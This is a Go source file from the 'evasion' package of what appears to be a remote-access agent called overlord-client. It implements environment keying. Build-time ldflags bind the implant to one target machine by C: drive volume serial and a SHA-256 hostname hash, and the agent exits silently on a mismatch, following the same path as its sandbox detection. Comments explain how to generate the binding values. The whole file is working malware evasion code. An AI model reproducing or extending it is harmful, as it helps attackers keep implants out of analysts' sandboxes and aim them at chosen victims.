//go:build windows
// +build windows

package evasion

// Environment binding — ties the agent to a specific machine.
//
// Two optional checks are injected at build time via ldflags:
//
//	-X overlord-client/cmd/agent/evasion.envBindVolumeSerial=DEADBEEF
//	    Expected uppercase hex of the C:\ volume serial number.
//
//	-X overlord-client/cmd/agent/evasion.envBindHostnameHash=0a1b2c3d
//	    First 8 hex chars of SHA-256(lowercase(hostname)).
//
// When a binding is set and the running machine doesn't match, evadeSandbox()
// calls os.Exit(0) silently — the same path as a sandbox detection.
//
// Generate the hostname hash:
//
//	python3 -c "import hashlib,sys; print(hashlib.sha256(sys.argv[1].lower().encode()).hexdigest()[:8])" DESKTOP-ABC123
//
// Generate the volume serial:
//
//	PowerShell: (Get-Volume -DriveLetter C).UniqueId  or
//	            (Get-Item C:\).Root.GetType().InvokeMember(...)
//	cmd:        vol C:   (last field on second line)

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	"golang.org/x/sys/windows"
)

var (
	envBindVolumeSerial string
	envBindHostnameHash string
)

// checkTargetedBinding returns false when a binding is configured and the
// current machine does not satisfy it.  Skipped entirely when both vars
// are empty (the common case — no targeted deployment).
func checkTargetedBinding() bool {
	if envBindVolumeSerial != "" {
		serial, ok := cDriveSerial()
		if !ok {
			return false
		}
		got := strings.ToUpper(fmt.Sprintf("%08X", serial))
		want := strings.ToUpper(strings.TrimSpace(envBindVolumeSerial))
		if got != want {
			return false
		}
	}

	if envBindHostnameHash != "" {
		name, err := os.Hostname()
		if err != nil {
			return false
		}
		h := sha256.Sum256([]byte(strings.ToLower(strings.TrimSpace(name))))
		got := hex.EncodeToString(h[:4]) // first 4 bytes = 8 hex chars
		want := strings.ToLower(strings.TrimSpace(envBindHostnameHash))
		if got != want {
			return false
		}
	}

	return true
}

func cDriveSerial() (uint32, bool) {
	root, err := windows.UTF16PtrFromString(`C:\`)
	if err != nil {
		return 0, false
	}
	var serial uint32
	if err = windows.GetVolumeInformation(root, nil, 0, &serial, nil, nil, nil, 0); err != nil {
		return 0, false
	}
	return serial, true
}
